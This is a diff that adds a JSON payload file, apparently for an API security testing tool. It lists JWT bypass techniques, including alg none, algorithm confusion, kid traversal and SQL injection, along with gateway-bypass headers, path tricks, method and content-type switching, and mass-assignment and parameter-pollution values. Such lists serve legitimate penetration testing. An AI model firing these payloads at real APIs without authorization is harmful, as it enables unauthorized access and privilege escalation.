@@ -1,0 +1,42 @@
+{
+  "jwt_bypasses": [
+    {"name": "none_algorithm", "description": "Set alg to none, strip signature"},
+    {"name": "alg_confusion_hs256", "description": "RS256→HS256, sign with public key as HMAC"},
+    {"name": "kid_injection_devnull", "description": "Set kid to ../../dev/null"},
+    {"name": "kid_injection_sqli", "description": "Set kid to SQL injection payload"},
+    {"name": "jwk_injection", "description": "Embed attacker JWK in header"},
+    {"name": "signature_stripping", "description": "Remove signature entirely"},
+    {"name": "expired_token_reuse", "description": "Use token with past exp claim"},
+    {"name": "role_elevation", "description": "Add is_admin=true or role=admin claims"}
+  ],
+  "gateway_bypasses": [
+    {"name": "x_forwarded_for", "headers": {"X-Forwarded-For": "127.0.0.1"}},
+    {"name": "x_real_ip", "headers": {"X-Real-IP": "127.0.0.1"}},
+    {"name": "x_original_url", "headers": {"X-Original-URL": "/admin"}},
+    {"name": "x_rewrite_url", "headers": {"X-Rewrite-URL": "/admin"}},
+    {"name": "host_override", "headers": {"Host": "internal-api.target.com"}},
+    {"name": "trailing_slash", "path_suffix": "/"},
+    {"name": "semicolon", "path_suffix": ";.js"},
+    {"name": "dot_segment", "path_transform": "insert_dot_segment"}
+  ],
+  "method_switches": ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"],
+  "content_type_switches": [
+    "application/json",
+    "application/x-www-form-urlencoded",
+    "multipart/form-data",
+    "text/plain",
+    "application/xml"
+  ],
+  "mass_assignment_fields": [
+    {"role": "admin"}, {"is_admin": true}, {"admin": 1},
+    {"user_type": "admin"}, {"permissions": "*"}, {"privilege": "root"},
+    {"role_id": 1}, {"is_staff": true}, {"is_superuser": true},
+    {"verified": true}, {"approved": true}, {"active": true}
+  ],
+  "param_pollution": [
+    {"type": "array_injection", "example": {"id": [1, 2]}},
+    {"type": "duplicate_param", "example": "id=1&id=2"},
+    {"type": "nested_json", "example": {"data": {"id": 1}}},
+    {"type": "php_array", "example": "id[]=1&id[]=2"}
+  ]
+}
